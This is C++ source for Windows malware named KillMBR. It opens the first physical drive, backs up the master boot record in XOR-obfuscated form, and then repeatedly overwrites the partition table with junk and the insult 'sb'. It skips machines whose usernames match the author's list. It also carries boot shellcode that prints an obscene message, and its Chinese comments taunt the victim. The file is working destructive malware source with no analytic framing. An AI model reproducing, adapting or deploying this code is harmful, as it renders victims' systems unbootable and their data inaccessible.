#include "stdafx.h"
#include "KillMBR.h"
#include <Shlwapi.h>
#include <winioctl.h>
#include <Winnetwk.h>

unsigned char Scode[36] = {
    0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBD, 0x18, 0x7C, 0xB9, 0x18, 0x00, 0xB9, 0x01, 0x13, 0xBB, 0x0C, 
    0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xE2, 0xFE, 0x46, 0x75, 0x63, 0x6B, 0x20, 0x59, 0x6F, 0x75, 
    0x20, 0x3A, 0x2D, 0x29
};

TCHAR *pObviate[] = {_T("Micro"),
                    _T("huangqi"),
                    _T("EvilKnight"),
                    _T("bowen")} ;

// 判断是不是我自己的电脑，是的话就不要执行了
// 返回TRUE的话就不是我的电脑，返回FALSE的话就是我的电脑
static BOOL bIsExecute(void)
{
    // 取得用户名
    TCHAR szUserName[MAX_PATH] = {0} ;
    DWORD dwSize = MAX_PATH ;
    if (NO_ERROR != WNetGetUser(NULL, szUserName, &dwSize))
    {
        // 如果失败了，就当成是我的电脑吧
        return FALSE ;
    }

    for (int i = 0; i < sizeof(pObviate)/sizeof(TCHAR *); ++i)
    {
        if (StrStrI(szUserName, pObviate[i]))
        {
            return FALSE ;
        }
    }
    return TRUE ;

}

BOOL KillMBR()
{
    BOOL bResult = FALSE ;
    HANDLE hDevice;
    DWORD dwBytesWritten, dwBytesReturned, dwBytesRead;
    BYTE MBR[512*2] = {0};
    int i = 0 , j = 0;

    if (FALSE == bIsExecute())
    {
        return FALSE ;
    }

    hDevice = CreateFile(_T("\\\\.\\PHYSICALDRIVE0"),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    DeviceIoControl(hDevice, 
        FSCTL_LOCK_VOLUME, 
        NULL, 
        0, 
        NULL, 
        0, 
        &dwBytesReturned, 
        NULL);
    // 读入原来的MBR
    // 做坏事不能太绝，先帮他备份一份
    if(FALSE == ReadFile(hDevice, MBR, SECTORSIZE, &dwBytesRead, NULL))
    {
        goto EXIT_PROC ;
    }

    // 将MBR备份的异或
    for (i = 0; i < SECTORSIZE; ++i)
    {
        MBR[SECTORSIZE + i] = MBR[i] ^ XORVALUE ;
    }

    SetFilePointer(hDevice,0, 0, FILE_BEGIN) ;
    WriteFile(hDevice, MBR, sizeof(MBR), &dwBytesWritten, NULL);

    // 重复写24次，弄死你呀的
    for(i = 0; i < 24; ++i)
    {
        for (j = 0x1be; j < 0x200 - 2; ++j)
        {
            MBR[j] = i ;
        }
        SetFilePointer(hDevice,0, 0, FILE_BEGIN) ;
        WriteFile(hDevice, MBR, sizeof(MBR) / 2, &dwBytesWritten, NULL);
    }

    // 最后再将sb写进去，气死你呀的
    // 保留结束标志
    for (j = 0x1be; j < 0x200 - 2; j += 2)
    {
        MBR[j] = 's' ;
        MBR[j+1] = 'b' ;
    }

    SetFilePointer(hDevice,0, 0, FILE_BEGIN) ;
    WriteFile(hDevice, MBR, sizeof(MBR) / 2, &dwBytesWritten, NULL);

    bResult = TRUE ;
EXIT_PROC:
    DeviceIoControl(hDevice, 
        FSCTL_UNLOCK_VOLUME, 
        NULL, 
        0, 
        NULL, 
        0, 
        &dwBytesReturned, 
        NULL
        );

    CloseHandle(hDevice);

    return bResult;
}
